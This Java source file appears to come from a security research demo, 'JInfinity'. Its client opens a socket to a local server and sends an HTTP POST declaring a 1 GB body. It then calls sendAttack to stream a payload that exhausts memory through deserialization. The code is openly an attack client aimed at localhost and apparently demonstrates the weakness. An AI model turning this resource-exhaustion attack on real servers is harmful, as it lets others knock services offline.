package com.contrastsecurity.jinfinity.demo;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;

import org.apache.commons.io.IOUtils;

import com.contrastsecurity.jinfinity.JInfinity;
import com.contrastsecurity.jinfinity.JInfinityProgressListener;

public class DemoClient implements JInfinityProgressListener {
	
	private static final long PAYLOAD_SIZE = 1/*gb*/ * 1000/*mb*/ * 1000/*kb*/ * 1000/*bytes*/;
	private static final String SERVER = "localhost";
	private static final int PORT = 8080;
	
	/**
	 * Start attacking the app. Keep track of the rate of reading from the server
	 * end, which can be used to detect memory exhaustion.
	 * @throws IOException 
	 */
	public void runAttack() throws IOException {
		
		if(!tryConnect()) {
			System.err.println("[!] Server appears to be down. Please start the server before attacking!");
			return;
		}
		
		Socket socket = null;
		try {
			socket = buildSocket();
			OutputStream os = socket.getOutputStream();
			
			int overhead = 7;
			if(PAYLOAD_SIZE > 0xFFFF) {
				overhead = 13;
			}
			String requestHeader = REQUEST_START.replace("{{SIZE}}", String.valueOf(PAYLOAD_SIZE + overhead));
			os.write(requestHeader.getBytes());
			
			JInfinity jin = new JInfinity();
			jin.setListener(this, 10*1000);
			jin.sendAttack(os, PAYLOAD_SIZE);
			
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			IOUtils.closeQuietly(socket);
		}
	}

	private Socket buildSocket() throws UnknownHostException, IOException {
		return new Socket(SERVER, PORT);
	}

	boolean tryConnect() {
		try {
			Socket socket = buildSocket();
			socket.close();
			return true;
		} catch (IOException e) { }
		return false;
	}

	public void onChunkWritten(long bytesWritten) {
		
	}
	
	private static final String REQUEST_START =
			"POST /ds/read HTTP/1.1\n" + 
			"Host: localhost:8080\n" + 
			"Content-Length: {{SIZE}}\n" + 
			//"Content-Length: 5\n" +
			"Content-Type: application/binary\n\n";
	
}
